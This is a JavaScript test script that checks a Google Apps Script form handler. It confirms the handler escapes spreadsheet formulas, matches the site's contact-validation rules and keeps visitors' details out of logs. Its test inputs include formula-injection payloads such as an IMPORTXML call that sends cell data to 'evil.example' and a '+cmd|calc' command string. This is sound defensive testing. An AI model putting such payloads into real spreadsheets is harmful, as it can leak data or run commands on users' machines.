// Apps Script check: run with `node tests/check-apps-script.mjs` (or `npm run check:script`).
// Runs apps-script/Code.gs against a pretend spreadsheet and makes sure that:
//   - its contact rules give exactly the same answers as the form's (src/contact.js), so the sheet never
//     refuses details the form accepted;
//   - nothing a request sends can end up as a formula in the sheet;
//   - bad requests are refused and nothing personal is written to the log.
import vm from 'node:vm';
import { readFileSync } from 'node:fs';
import { checkContact } from '../src/contact.js';

const failures = [];
const expect = (ok, msg) => { if (!ok) failures.push(msg); };

// a pretend Google Sheets, Lock and Content service
const tabs = {}, logged = [];
const sheet = () => { const rows = []; return { rows, getLastRow: () => rows.length, appendRow: (r) => rows.push(r), setFrozenRows() {} }; };
const ctx = vm.createContext({
  SpreadsheetApp: { getActiveSpreadsheet: () => ({ getSheetByName: (n) => tabs[n] || null, insertSheet: (n) => (tabs[n] = sheet()) }) },
  LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
  ContentService: { createTextOutput: (s) => ({ text: s }) },
  console: { error: (m) => logged.push(String(m)), log() {} },
  Logger: { log() {} },
});
vm.runInContext(readFileSync(new URL('../apps-script/Code.gs', import.meta.url), 'utf8'), ctx);
const post = (body) => ctx.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).text;
const rows = (tab) => (tabs[tab] ? tabs[tab].rows.slice(1) : []);
const clear = () => { for (const k in tabs) delete tabs[k]; logged.length = 0; };

/* ---------- 1. the same contact rules on both sides ---------- */
const good = { name: 'Ali Yılmaz', email: 'Ali@Example.com', phone: '+90 555 123 45 67', consent: true };
const cases = [
  good, { ...good, phone: '' }, { ...good, phone: undefined }, { ...good, name: 'علي أحمد' }, { ...good, phone: '٠٥٥٥ ١٢٣ ٤٥٦٧' },
  { ...good, phone: '۰۵۵۵۱۲۳۴۵۶۷' }, { ...good, phone: '(0212) 555-12.34' }, { ...good, phone: '12345' }, { ...good, phone: '1234567890123456' },
  { ...good, phone: '555+1234567' }, { ...good, phone: 'call me' }, { ...good, email: 'ali@example' }, { ...good, email: 'ali example.com' },
  { ...good, email: ' ali @ example.com ' }, { ...good, email: '=cmd@example.com' }, { ...good, email: '<a>@b.co' }, { ...good, name: '=HYPERLINK("http://x","y")' },
  { ...good, name: '+-@=' }, { ...good, name: '   ' }, { ...good, name: 'A‮evil‬ name\u0000\u0007' }, { ...good, name: 'x'.repeat(500) },
  { ...good, consent: 'true' }, { ...good, consent: false }, { ...good, consent: 1 }, {}, null, { name: 7, email: 7, phone: 7, consent: true },
];
const alphabet = ['a', 'Z', '0', '9', '٣', '@', '.', '+', '-', '=', ' ', '(', ')', '"', '<', '‮', '\u0000', 'ı', 'ع', '\t'];
const pick = (n) => Array.from({ length: Math.floor(Math.random() * n) }, () => alphabet[Math.floor(Math.random() * alphabet.length)]).join('');
for (let i = 0; i < 3000; i++) cases.push({ name: pick(12), email: pick(6) + '@' + pick(6) + '.' + pick(4), phone: pick(18), consent: Math.random() < 0.8 });
for (const c of cases) {
  const site = JSON.stringify(checkContact(c)), script = JSON.stringify(ctx.checkContact(c));
  expect(site === script, `contact rules differ for ${JSON.stringify(c)}:\n  site   ${site}\n  script ${script}`);
}

/* ---------- 2. what reaches the sheet ---------- */
const plain = (v) => typeof v !== 'string' || v === '' || /^'[^=+\-@]/.test(v);
const result = { type: 'result', time: '2026-11-28T10:15:00.000Z', lang: 'en', style: 'scale', stream: 'I', personality: 'design', strengths: 'design launch hub', nextStep: 'apply', scores: 'F:0.1 I:0.5 H:0.3', answers: 's1=3 s2=0' };

clear();
expect(post(result) === 'ok' && rows('Results').length === 1, 'a normal survey result is not saved');
expect(post({ ...result, type: undefined }) === 'ok', 'a result queued before rows had a type is refused');
expect(post({ ...result, personality: '=IMPORTXML("https://evil.example/?"&A1,"//a")', answers: '+cmd|calc', scores: '@SUM(1)' }) === 'ok', 'a result with odd text is refused');
expect(tabs.Results.rows[0].join() === 'time,lang,style,stream,personality,strengths,nextStep,scores,answers', 'the Results headings are wrong');
for (const r of rows('Results')) for (const v of r.slice(4)) expect(plain(v), `a Results value could become a formula: ${v}`);
for (const [what, bad] of [['language', { lang: 'EN<script>' }], ['stream', { stream: '=1' }], ['time', { time: '=NOW()' }], ['style', { style: 'x' }], ['type', { type: 'admin' }]]) {
  expect(post({ ...result, ...bad }) === 'error', `a result with a bad ${what} is saved`);
}
expect(rows('Results').length === 3, 'refused results still added rows');

clear();
const contact = { type: 'contact', lang: 'tr', stream: 'H', ...good, consentText: 'I agree…' };
expect(post(contact) === 'ok', 'valid contact details are refused');
expect(post({ ...contact, name: '=HYPERLINK("https://evil.example","Click")', phone: '٠٥٥٥ ١٢٣ ٤٥٦٧' }) === 'ok', 'a contact with a formula-like name is refused');
const [c1, c2] = rows('Contacts');
expect(c1 && c1[3] === "'Ali Yılmaz" && c1[4] === "'ali@example.com" && c1[5] === "'+90 555 123 45 67" && c1[6] === "'yes: I agree…", `contact row is stored wrongly: ${JSON.stringify(c1)}`);
expect(c1 && Object.prototype.toString.call(c1[0]) === '[object Date]', 'the contact time is not the server’s own clock');
expect(c2 && c2[3] === `'HYPERLINK("https://evil.example","Click")` && c2[5] === "'0555 123 4567", `formula-like contact is stored wrongly: ${JSON.stringify(c2)}`);
// a phone number may keep its leading + (it holds only digits, spaces and ( ) . -, so it cannot run as anything)
for (const r of rows('Contacts')) r.slice(3).forEach((v, i) => expect(plain(v) || (i === 2 && /^'\+[0-9 ().-]+$/.test(v)), `a Contacts value could become a formula: ${v}`));
for (const [what, bad] of [['no consent', { consent: false }], ['consent as text', { consent: 'true' }], ['bad email', { email: 'nope' }], ['bad phone', { phone: 'abc' }], ['no name', { name: '' }]]) {
  expect(post({ ...contact, ...bad }) === 'error', `contact details with ${what} are saved`);
}
expect(rows('Contacts').length === 2, 'refused contacts still added rows');
expect(!logged.some((m) => /ali|yılmaz|example\.com|555/i.test(m)), 'the log contains a visitor’s details: ' + logged.join(' | '));
expect(rows('Results').length === 0, 'contact details were written to the Results tab');

for (const [what, body] of [['not JSON', 'hello'], ['empty', ''], ['too large', JSON.stringify({ ...result, answers: 'x'.repeat(20000) })], ['a list', '[1,2]'], ['null', 'null']]) {
  expect(post(body) === 'error', `a request that is ${what} is accepted`);
}

if (failures.length) { console.log(failures.slice(0, 20).map((f) => 'FAIL: ' + f).join('\n')); process.exit(1); }
console.log(`Apps Script check passed (${cases.length} contact inputs compared, sheet writes checked).`);
